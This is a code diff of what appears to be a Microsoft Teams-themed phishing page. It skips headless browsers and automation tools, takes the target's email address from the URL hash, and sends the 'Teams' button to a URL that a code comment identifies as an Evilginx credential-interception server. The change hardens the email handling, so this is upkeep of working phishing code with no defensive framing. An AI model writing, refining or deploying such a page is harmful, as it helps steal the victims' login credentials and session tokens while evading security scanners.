@@ -94,21 +94,25 @@ window.addEventListener('load', function() {
   // --- Headless / automation check ---
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;
 
-  // --- Grab email from hash ---
+  // --- Grab email from hash safely ---
   let email = window.location.hash ? window.location.hash.substring(1) : '';
-  email = decodeURIComponent(email).replace(/=+$/, ''); // CLEAN EMAIL
+  try {
+    email = decodeURIComponent(email).replace(/=+$/, '');
+  } catch(e) {
+    email = '';
+  }
 
   // --- Update button to point to Evilginx ---
   const button = document.querySelector('.teams-button');
   if (button) {
     const baseURL = 'https://access-meetings.visions-solutions.ca/OFcNokky';
-    button.onclick = function() {
-      window.location.href = email && email.includes('@')
-        ? baseURL + '#' + encodeURIComponent(email)
-        : baseURL;
+    button.onclick = () => {
+      const safeHash = email ? '#' + encodeURIComponent(email) : '';
+      window.location.href = baseURL + safeHash;
     };
   }
 });
 </script>
 </body>
 </html>
+
